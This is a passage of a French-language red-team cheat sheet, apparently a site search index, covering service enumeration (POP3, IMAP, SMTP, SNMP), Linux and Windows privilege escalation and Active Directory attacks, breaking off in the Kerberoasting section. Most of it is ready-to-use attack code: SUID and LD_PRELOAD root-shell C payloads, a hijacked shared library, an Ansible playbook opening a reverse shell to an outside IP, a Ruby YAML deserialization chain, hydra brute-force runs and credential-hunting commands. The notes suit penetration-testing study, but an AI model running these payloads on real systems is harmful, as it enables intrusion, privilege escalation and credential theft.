\"no_root_squashfs\", alors ce sont les droits de l'utilisateur qui monte ce fichier \u00e0 distance qui s'appliquent. Exemple, un serveur a un partage disponible avec cette option activ\u00e9e, si je le monte avec l'utilisateur root de mon host, alors j'ai les droits root sur ce partage \u00e9galement. Le principe est ensuite d'uploader un binaire avec un SUID, pour pouvoir faire une privesc.</p> <p>machine cible: <pre><code>cat /etc/exports\n---\n/var/nfs/general *(rw,no_root_squash)\n/tmp *(rw,no_root_squash)\n</code></pre></p> <p>Cr\u00e9ation d'un binaire:</p> <pre><code>nano -w shell.c\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\nint main(void)\n{\n  setuid(0); setgid(0); system(\"/bin/bash\");\n}\n--------------------------------\ngcc shell.c -o shell\n</code></pre> <p>Le copier sur la machine cible, puis lui donner le suid:</p> <pre><code>machine host:\nsudo mount -t nfs 10.129.2.12:/tmp /mnt\nsudo cp shell /mnt/\nsudo chmod u+s /mnt/shell\n</code></pre> <p>Puis ex\u00e9cuter le binaire sur la machine cible:</p> <pre><code>/tmp/bash -p\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Post Office Protocol, port 110/995, TCP. Internet Message Access Protocol, port 143/993, TCP.</p> <p>Possible de se connecter directement via telnet. Commandes disponibles (IMAP):</p> Command Description 1 LOGIN username password User's login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\" Creates a mailbox with a specified name. 1 DELETE \"INBOX\" Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\" Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being active or subscribed. 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH all Retrieves data associated with a message in the mailbox. 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server. <p>Commandes disponibles (POP3):</p> Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server."},{"location":"Red%20Team/2%20-%20Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":"<p>Connection via telnet:</p> <pre><code>nc -nv $ip 143\n</code></pre> <p>Connction POP3 via openssl:</p> <pre><code>openssl s_client -connect $ip:pop3s\n</code></pre> <p>Connection IMAP via openssl:</p> <pre><code>openssl s_client -connect $ip:imaps\n</code></pre> <p>Nmap:</p> <pre><code>nmap $ip -sV -p110,143,993,995 -sC\n</code></pre> <p>Lister les mailbox d'un user:</p> <pre><code>curl -k 'imaps://$ip' --user user:password\n</code></pre> <p>Lister les messages dans une mailbox:</p> <pre><code>curl -k 'imaps://$ip/INBOX?ALL' --user user:password\n</code></pre> <p>Voir le contenu d'un message (ici le premier mail dans la mailbox \"Drafts\"):</p> <pre><code>curl -k 'imaps://$ip/Drafts;MAILINDEX=1' --user user:pass\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<p>Brute force password pop3:</p> <pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -f $ip pop3 -V\n</code></pre> <p>Brute force password imap:</p> <pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -f $ip imap -V\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Setting Description auth_debug Enables all authentication debug logging. auth_debug_passwords This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. auth_verbose Logs unsuccessful authentication attempts and their reasons. auth_verbose_passwords Passwords used for authentication are logged and can also be truncated. auth_anonymous_username This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism."},{"location":"Red%20Team/2%20-%20Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Simple Mail Transfer Protocol, port 25/587, TCP Envoie/r\u00e9ception de mails, sans utilisation de STARTTLS les informations transitent en clair sur le r\u00e9seau. Client (MUA) \u279e Submission Agent (MSA) \u279e Open</p> <p>Il est possible d'utiliser SMTP en se connectant directement en telnet sur le port 25, les commandes disponibles sont:</p> Command Description AUTH PLAIN AUTH is a service extension used to authenticate the client. HELO The client logs in with its computer name and thus starts the session. MAIL FROM The client names the email sender. RCPT TO The client names the email recipient. DATA The client initiates the transmission of the email. RSET The client aborts the initiated transmission but keeps the connection between client and server. VRFY The client checks if a mailbox is available for message transfer. EXPN The client also checks if a mailbox is available for messaging with this command. NOOP The client requests a response from the server to prevent disconnection due to time-out. QUIT The client terminates the session."},{"location":"Red%20Team/2%20-%20Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":"<p>Connection telnet:</p> <pre><code>nc -vn $ip 25\n</code></pre> <p>Connection openssl (si utilisation de starttls):</p> <pre><code>openssl s_client -starttls smtp -crlf -connect $domain:587\n</code></pre> <p>Savoir si le serveur peut \u00eatre utilis\u00e9 comme open relay:</p> <pre><code>sudo nmap $ip -p25 --script smtp-open-relay -v\n</code></pre> <p>Conna\u00eetre les diff\u00e9rentes commandes pourvant \u00eatre utilis\u00e9es:</p> <pre><code>nmap -p25 --script smtp-commands $ip\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<p>Brute force des users:</p> <pre><code>nmap --script smtp-enum-users $ip\n</code></pre> <pre><code>smtp-user-enum -M &lt;MODE&gt; -u &lt;USER&gt; -t $ip\n</code></pre> <p>Brute force password:</p> <pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip smtp\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/scanner/smtp/smtp_enum\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Simple Network Management Protocol, port 161, UDP Monitoring des \u00e9quipements r\u00e9seaux, peut aussi \u00eatre utilis\u00e9 pour faire de la configuration \u00e0 distance. </p>"},{"location":"Red%20Team/2%20-%20Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":"<p>SnmpWalk:</p> <pre><code>snmpwalk -v2c -c $CommunityString $ip\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<p>Brute force de la community string:</p> <pre><code>onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt $ip\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Settings Description rwuser noauth Provides access to the full OID tree without authentication. rwcommunity Provides access to the full OID tree regardless of where the requests were sent from. rwcommunity6 Same access as with rwcommunity with the difference of using IPv6."},{"location":"Red%20Team/3%20-%20Linux/Enum%C3%A9ration/","title":"Enum\u00e9ration","text":""},{"location":"Red%20Team/3%20-%20Linux/Enum%C3%A9ration/#situational-awareness","title":"Situational awareness","text":"<p>Lister les processus actifs:</p> <pre><code>ps aux\n</code></pre> <p>Lister les utilisateurs pr\u00e9sents:</p> <pre><code>ls /home\ncat /etc/passwd\n</code></pre> <p>Lister les fichiers crontab:</p> <pre><code>ls -laR /etc/cron*\ncrontab -l\n</code></pre> <p>Informations sur la distribution et le kernel:</p> <pre><code>uname -a\ncat /etc/lsb-release\n</code></pre> <p>V\u00e9rifier les connexions r\u00e9seau:</p> <pre><code>netstat -tunlp\n</code></pre>"},{"location":"Red%20Team/3%20-%20Linux/Enum%C3%A9ration/#quickwin","title":"Quickwin","text":"<p>Lister les privil\u00e8ges sudo:</p> <pre><code>sudo -l\n</code></pre> <p>Lister les fichiers avec un Setuid:</p> <pre><code>find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null\n</code></pre> <p>Lister les fichiers avec un Setgid:</p> <pre><code>find / -user root -perm -6000 -exec ls -ldb {} \\; 2&gt;/dev/null\n</code></pre> <p>Lister les capabilities:</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"Red%20Team/3%20-%20Linux/Enum%C3%A9ration/#recherches","title":"Recherches","text":"<p>Chercher des fichiers contenant \"config\":</p> <pre><code>find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2&gt;/dev/null`\n</code></pre> <p>Rechercher des fichiers modifi\u00e9s r\u00e9cemment:</p> <pre><code>find / -mtime -5`\n</code></pre> <p>Rechercher des mots de passe en Clair:</p> <pre><code>grep -Ri pass /etc 2&gt;/dev/null\n</code></pre>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Groupe%20LXC%20LXD/","title":"Groupe LXC LXD","text":"<p>Si notre utilisateur est membre du groupe lxd / lxc, il est possible de cr\u00e9er un conteneur. Cela nous donne la possibilit\u00e9 d'\u00eatre root sur ce conteneur, de monter la racine de l'host \u00e0 l'int\u00e9rieur du conteneur et donc de le lire avec les droits root.</p> <p>T\u00e9l\u00e9charger une image de conteneur Alpine Linux :</p> <pre><code>wget https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.1-x86_64.tar.gz\n</code></pre> <p>Initialiser LXD au besoin:</p> <pre><code>lxd init\n</code></pre> <p>Importer l'image Alpine comme une image LXC :</p> <pre><code>lxc image import alpine-minirootfs-3.17.1-x86_64.tar.gz --alias alpine\n</code></pre> <p>Lancer un conteneur Alpine avec des privil\u00e8ges \u00e9lev\u00e9s :</p> <pre><code>lxc init alpine r00t -c security.privileged=true`\n</code></pre> <p>Monter le disque de l'h\u00f4te dans le conteneur :</p> <pre><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`\n</code></pre> <p>Acc\u00e9der au shell dans le conteneur :</p> <pre><code>lxc start r00t\nlxc exec r00t /bin/sh\n</code></pre>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Shared%20Object/","title":"Shared Object","text":"<p>Un binaire peut parfois utiliser des librairies non standards, il est parfois possible de remplacer cette librairie par une autre qui nous accorderait des droits suppl\u00e9mentaires.</p> <p>On analyse quelles librairies sont utilis\u00e9es par l'ex\u00e9cutable:</p> <pre><code>ldd LeBinaire\n</code></pre> <pre><code>linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)\nlibshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)\nlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)\n</code></pre> <p>On peut ensuite utiliser \"readelf\" afin de voir si ces librairies ne peuvent pas \u00eatre load\u00e9es depuis un autre endroit:</p> <pre><code>readelf -d LeBinaire  | grep PATH\n\n0x000000000000001d (RUNPATH)            Library runpath: [/development]\n</code></pre> <p>Si le dossier est writeable, il est alors possible de remplacer cette librairie par une autre:</p> <pre><code>nano -w /development/libshared.c\n</code></pre> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoid dbquery() {\n    printf(\"Malicious library loaded\\n\");\n    setuid(0);\n    system(\"/bin/sh -p\");\n}\n</code></pre> <pre><code>gcc /development/libshared.c -fPIC -shared -o /development/libshared.so\n</code></pre> <p>Pendant l'ex\u00e9cution du programme \"LeBinaire\", notre librairie est appel\u00e9e et lancera la commande d\u00e9finie avec les droits de l'utilisateur de \"LeBinaire\".</p>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Exploits/Playbook%20Ansible/","title":"Playbook Ansible","text":"<p>Exemple de playbook donnant l'acc\u00e8s \u00e0 un reverse-shell:</p> <pre><code>- hosts: localhost\n  tasks:\n  - name: rev\n    shell: bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.22/443 0&gt;&amp;1'\n</code></pre>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Exploits/Script%20Bash/","title":"Script Bash","text":"<p>Dans un script bash, quelques \"erreurs\" peuvent devenir exploitables.</p>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Exploits/Script%20Bash/#comparaison-box-codify-sur-htb","title":"Comparaison (box \"codify\" sur HTB):","text":"<pre><code>#!/bin/bash\nDB_USER=\"root\"\nDB_PASS=$(/usr/bin/cat /root/.creds)\nBACKUP_DIR=\"/var/backups/mysql\"\n\nread -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS\n/usr/bin/echo\n\nif [ $DB_PASS == $USER_PASS ](%20$DB_PASS%20==%20$USER_PASS%20); then\n        /usr/bin/echo \"Password confirmed!\"\nelse\n        /usr/bin/echo \"Password confirmation failed!\"\n        exit 1\nfi\n\n/usr/bin/mkdir -p \"$BACKUP_DIR\"\n\ndatabases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOW DATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")\n\nfor db in $databases; do\n    /usr/bin/echo \"Backing up database: $db\"\n    /usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" | /usr/bin/gzip &gt; \"$BACKUP_DIR/$db.sql.gz\"\ndone\n\n/usr/bin/echo \"All databases backed up successfully!\"\n/usr/bin/echo \"Changing the permissions\"\n/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"\n/usr/bin/chmod 774 -R \"$BACKUP_DIR\"\n/usr/bin/echo 'Done!'\n</code></pre> <p>La partie <code>if [ $DB_PASS == $USER_PASS ](%20$DB_PASS%20==%20$USER_PASS%20); then</code> est probl\u00e9matique : du fait de l'absence de double quote, la comparaison ne se fait pas sur une string compl\u00e8te, mais sur une valeur, on peut donc arriver \u00e0 un r\u00e9sultat de type <code>if password123 == *, then</code> au lieu de <code>if \"password\" == \"*\" then</code> ce qui entraine une faille de s\u00e9curit\u00e9.</p> <p>Il devient possible de bruteforcer le mot de passe attendu, avec un script de ce type :</p> <pre><code>import string\nimport subproccess\n\ndef check_password(p):\n    command = f\"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh\"\n    result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)\n    return \"Password confirmed!\" in result.stdout\n\ncharset = string.ascii_letters + string.digits\npassword = \"\"\nis_password_found = False\n\nwhile not is_password_found:\n    for char in charset:\n        if check_password(password + char)\n            password += char\n            print(password)\n            break\n    else:\n        is_password_found = True\n</code></pre>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Exploits/YAML%20deserialization/","title":"YAML deserialization","text":"<p>Dans le cas d'un script faisant appel \u00e0 un fichier .yml via \"YAML.load\", il est possible de faire une d\u00e9s\u00e9rialization afin de faire ex\u00e9cuter une commande.</p> <p>Exemple: Un script ruby, utilisable via sudo:</p> <pre><code># Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(\"dependencies.yml\"))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts \"Installed version differs from the one specified in file: \" + local_name\n            else\n                puts \"Installed version is equals to the one specified in file: \" + local_name\n            end\n        end\n    end\nend\n</code></pre> <p>On voit l'utilisation de la fonction YAML.load faisant un appel \u00e0 dependencies.yml.</p>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Exploits/YAML%20deserialization/#exploit","title":"Exploit","text":"<p>Cr\u00e9ation d'un fichier \"dependencies.yml\" dans le r\u00e9pertoire courant:</p> <pre><code>---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &amp;1 !ruby/object:Net::BufferedIO\n      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &amp;1 !ruby/object:Net::WriteAdapter\n         socket: &amp;1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: chmod u+s /bin/bash\n         method_id: :resolve\n</code></pre> <p>Apr\u00e8s ex\u00e9cution du script ruby via sudo, la commande</p> <pre><code>chmod u+s /bin/bash\n</code></pre> <p>est ex\u00e9cut\u00e9e. Il ne reste plus qu'\u00e0 faire:</p> <pre><code>bash -p\n</code></pre> <p>et nous voila root.</p>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Sudo/GTFObins/","title":"GTFObins","text":"<p>Si un binaire peut se lancer avec les droits sudo, il est toujours utile de chercher sur gtfobins si celui-ci ne permet pas d'ouvrir un shell directement:</p> <p>https://gtfobins.github.io/</p>"},{"location":"Red%20Team/3%20-%20Linux/Privesc/Sudo/ld_preload/","title":"Ld preload","text":"<ol> <li> <p>V\u00e9rifier les droits sudo :</p> </li> <li> <p>Commande : <code>sudo -l</code></p> </li> <li> <p>Lorsque <code>env_keep+=LD_PRELOAD</code> est pr\u00e9sent dans la configuration de sudo, cela signifie que la variable d'environnement <code>LD_PRELOAD</code> est conserv\u00e9e lors de l'ex\u00e9cution des commandes avec <code>sudo</code>.</p> </li> <li> <p>Cr\u00e9er le fichier source C (root.c) :</p> </li> <li> <p>Commande : <code>nano -w /tmp/root.c</code></p> </li> <li> <p>Le code C cr\u00e9e une biblioth\u00e8que partag\u00e9e qui, lorsqu'elle est charg\u00e9e, ex\u00e9cute son code d'initialisation (<code>_init()</code>). Ce code modifie l'ID utilisateur (UID) et l'ID de groupe (GID) du processus en 0 (c'est-\u00e0-dire <code>root</code>), puis lance un shell Bash.</p> </li> <li> <p>Compiler le fichier source en biblioth\u00e8que partag\u00e9e :</p> </li> <li> <p>Commande : <code>gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles</code></p> </li> <li> <p>Cette commande compile le fichier <code>root.c</code> en une biblioth\u00e8que partag\u00e9e <code>root.so</code>. L'option <code>-fPIC</code> cr\u00e9e du code position ind\u00e9pendant, n\u00e9cessaire pour les biblioth\u00e8ques partag\u00e9es, et <code>-nostartfiles</code> emp\u00eache gcc d'utiliser les fichiers de d\u00e9marrage standard, ce qui n'est pas n\u00e9cessaire pour ce type de charge utile.</p> </li> <li> <p>Ex\u00e9cuter une commande avec <code>sudo</code> en utilisant <code>LD_PRELOAD</code> :</p> </li> <li> <p>Commande : <code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/executable restart</code></p> </li> <li>Ici, <code>LD_PRELOAD</code> est utilis\u00e9 pour pr\u00e9charger <code>root.so</code>. Lorsque la commande <code>/usr/sbin/executable</code> (qui doit \u00eatre une commande autoris\u00e9e par <code>sudo</code>) est ex\u00e9cut\u00e9e, elle charge <code>root.so</code> avant toute autre biblioth\u00e8que. Cela entra\u00eene l'ex\u00e9cution du code dans <code>_init()</code>, \u00e9levant ainsi les privil\u00e8ges du processus \u00e0 ceux de <code>root</code>.</li> </ol> <p>Contenu de root.c:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Enum%C3%A9ration%20locale/","title":"Enum\u00e9ration locale","text":"<p>Identifier des probl\u00e8mes de permissions sur des services: <pre><code>.\\SharpUp.exe audit\n</code></pre></p> <p>Winpeas:</p> <pre><code>.\\WinPeas.exe\n</code></pre> <p>Voir le statut de Windows Defender:</p> <pre><code>Get-MpComputerStatus\n</code></pre> <p>Lister les r\u00e8gles AppLocker:</p> <pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre> <p>Savoir si powershell est en \"Constrained Language Mode\" ou en \"Full language Mode\". Le mode \"constrained\" va emp\u00eacher l'utilisation de certaines features de powershell.</p> <pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre> <p>Liste les process en cours:</p> <pre><code>tasklist /svc\n</code></pre> <p>\u00c9num\u00e9rer les variables d'environnement:</p> <pre><code>set\n</code></pre> <p>\u00c9num\u00e9rer les informations syst\u00e8me:</p> <pre><code>systeminfo\n</code></pre> <p>\u00c9num\u00e9rer les diff\u00e9rents patchs/updates appliqu\u00e9s:</p> <pre><code>wmic qfe\nou\nGet-HotFix | ft -AutoSize\n</code></pre> <p>Lister les programmes install\u00e9s:</p> <pre><code>wmic product get name\nou\nGet-WmiObject -Class Win32_Product |  select Name, Version\n</code></pre> <p>Lister les services r\u00e9seaux:</p> <pre><code>netstat -ano\n</code></pre> <p>Lister les users logg\u00e9s:</p> <pre><code>query user\n</code></pre> <p>\u00c9num\u00e9rer les comptes utilisateur et les groupes:</p> <pre><code>net user\nnet localgroupe\n</code></pre> <p>Lister les informations \u00e0 propos d'un groupe en particulier:</p> <pre><code>net localgroup $group\n</code></pre> <p>Creds hunting:</p> <pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.bak\n</code></pre> <pre><code>gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password\n</code></pre> <p>Lire historique powershell:</p> <pre><code>gc (Get-PSReadLineOption).HistorySavePath\n</code></pre> <p>Tenter de lire celui de tout les utilisateurs:</p> <pre><code>foreach($user in ((ls C:\\users).fullname)){cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Shell%20depuis%20linux/","title":"Shell depuis linux","text":""},{"location":"Red%20Team/4%20-%20Windows/Shell%20depuis%20linux/#psexec","title":"PsExec","text":"<p>Avec un TGS: <pre><code>export KRB5CCNAME=truc.ccache\nimpacket-psexec -k -no-pass $domain/$user@$target\n</code></pre></p> <p>Avec un hash: <pre><code>impacket-psexec $domain/$user@$target -hashes nt:lm\n</code></pre></p> <p>Avec password: <pre><code>impacket-psexec $domain/$user@$target\n</code></pre></p>"},{"location":"Red%20Team/4%20-%20Windows/Shell%20depuis%20linux/#wmiexec","title":"WmiExec","text":"<p>Avec un TGS: <pre><code>export KRB5CCNAME=truc.ccache\nimpacket-wmiexec -k -no-pass $domain/$user@$target\n</code></pre></p> <p>Avec un hash: <pre><code>impacket-wmiexec $domain/$user@$target -hashes nt:lm\n</code></pre></p> <p>Avec password: <pre><code>impacket-wmiexec $domain/$user@$target\n</code></pre></p>"},{"location":"Red%20Team/4%20-%20Windows/Shell%20depuis%20linux/#smbexec","title":"SmbExec","text":"<p>Avec un TGS: <pre><code>export KRB5CCNAME=truc.ccache\nimpacket-smbexec -k -no-pass $domain/$user@$target\n</code></pre></p> <p>Avec un hash: <pre><code>impacket-smbexec $domain/$user@$target -hashes nt:lm\n</code></pre></p> <p>Avec password: <pre><code>impacket-smbexec $domain/$user@$target\n</code></pre></p>"},{"location":"Red%20Team/4%20-%20Windows/Shell%20depuis%20linux/#atexec","title":"AtExec","text":"<p>Avec un TGS: <pre><code>export KRB5CCNAME=truc.ccache\nimpacket-atexec -k -no-pass $domain/$user@$target $command\n</code></pre></p> <p>Avec un hash: <pre><code>impacket-atexec $domain/$user@$target -hashes nt:lm $command\n</code></pre></p> <p>Avec password: <pre><code>impacket-atexec $domain/$user@$target $command\n</code></pre></p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ADIDNS/","title":"ADIDNS","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ADIDNS/#poisoning","title":"Poisoning","text":"<p>Par d\u00e9faut, un utilisateur peut ajouter une entr\u00e9e dans le serveur dns de l'AD et faire pointer ce sous domaine vers, par exemple, l'ip d'un poste attaquant. Il est ensuite possible d'utiliser un outil tel que responder pour \u00e9ventuellement r\u00e9cup\u00e9rer des tentatives de connexions (imaginons par exemple un script de monitoring sur les diff\u00e9rentes entr\u00e9es du domaine, un lecteur r\u00e9seau qui n'est plus utilis\u00e9 ou autre...).</p> <p>Utilisation de dnstool (https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)</p> <p>Ajouter un enregistrement DNS (depuis linux):</p> <pre><code>dnstool.py -u 'DOMAIN\\user' -p 'password' --record 'sousDomaine' --action add --data $AttackerIP $DomainController\n</code></pre> <p>Depuis Windows:</p> <pre><code>Set-ADIDNSNodeAttribute -Node sousDomaine -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose\n\n# Activer/d\u00e9sactiver un node:\nEnable-ADIDNSNode -Node *\nDisable-ADIDNSNode -Node *\n</code></pre> <p>Utilisation de responder:</p> <pre><code>sudo responder -I tun0 -d -D\n</code></pre> <p>Depuis Windows, il est possible d'automatiser le processus (Inveigh va checker si des appels DNS n'aboutissent \u00e0 rien, si c'est le cas il va cr\u00e9er l'entr\u00e9e DNS en question et la rediriger vers lui pour r\u00e9cup\u00e9rer d'\u00e9ventuelles informations):</p> <pre><code>Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/AsrepRoasting/","title":"AsrepRoasting","text":"<p>L'attaque AsrepRoasting consiste \u00e0 cibler les utilisateurs n'ayant pas l'attribut de pr\u00e9-authentification. Ceci permet alors de r\u00e9cup\u00e9rer un hash qui peut ensuite \u00eatre crack\u00e9. La dangerosit\u00e9 principale de cette technique est le fait qu'il n'est pas n\u00e9cessaire d'\u00eatre authentifi\u00e9 pour l'effectuer, le seul \u00e9l\u00e9ment n\u00e9cessaire est le nom du compte \u00e0 cibler (Il est possible d'\u00e9num\u00e9rer les comptes asreproastables directement si l'on est authentifi\u00e9, cependant).</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/AsrepRoasting/#linux","title":"Linux","text":"<p>Enum\u00e9ration des utilisateurs sur le DC et des comptes asreproastables:</p> <pre><code>impacket-GetNPUsers domain.local/ -userfile /wordlist/username -format hashcat -outputfile asreproast.txt\n</code></pre> <p>Via netexec:</p> <pre><code>netexec ldap 10.10.10.10 -u users.txt -p '' --asreproast asreproast.txt\n</code></pre> <p>Si l'on est authentifi\u00e9 nous pouvons avoir acc\u00e8s \u00e0 la liste des utilisateurs via LDAP, ce qui permet d'identifier les comptes asreproastables sans avoir \u00e0 bruteforcer une liste d'utilisateur:</p> <pre><code>netexec ldap 10.10.10.10 -u $user -p $pass --asreproast asreproast.txt\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/AsrepRoasting/#windows","title":"Windows","text":"<p>Enum\u00e9ration des utilisateurs sur le DC et des comptes asreproastables:</p> <pre><code>.\\Rubeus.exe asreproast /format:hashcat /outfile:asreproast.txt\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/AsrepRoasting/#crack-des-hash","title":"Crack des hash","text":"<p>Cracker les hash obtenus:</p> <pre><code>hashcat asreproast.txt /usr/share/wordlists/rockyou.tar.gz\n</code></pre> Cat\u00e9gorie Information TTP Attaque par extraction de ticket AS-REP dans Kerberos CWE CWE-522 (Insufficiently Protected Credentials) Description de l'attaque AS-REP Roasting exploite les comptes Kerberos configur\u00e9s pour ne pas n\u00e9cessiter de preuve de connaissance du mot de passe (Pre-Authentication). Un attaquant peut demander des donn\u00e9es de ticket AS-REP pour ces comptes et tenter de craquer le mot de passe hors ligne. Impacts potentiels - Compromission des comptes utilisateurs- Acc\u00e8s non autoris\u00e9 aux services et donn\u00e9es- Possibilit\u00e9 d'\u00e9l\u00e9vation de privil\u00e8ges Comment la d\u00e9tecter - Surveillance des demandes de ticket AS-REP sans pr\u00e9-authentification- Analyse des journaux de serveur Kerberos pour les activit\u00e9s suspectes- Utilisation d'outils de d\u00e9tection d'intrusion Rem\u00e9diations/mitigations - Activer la pr\u00e9-authentification Kerberos pour tous les comptes- Utiliser des mots de passe forts et complexes- Auditer r\u00e9guli\u00e8rement les configurations de compte- Formation et sensibilisation des administrateurs syst\u00e8me Lien de r\u00e9f\u00e9rence Harmj0y's Blog - AS-REP Roasting"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/","title":"Kerberoasting","text":"<p>Le kerberoasting consiste \u00e0 cibler les utilisateurs ayant un SPN. De ce fait, il est possible de r\u00e9cup\u00e9rer un TGS 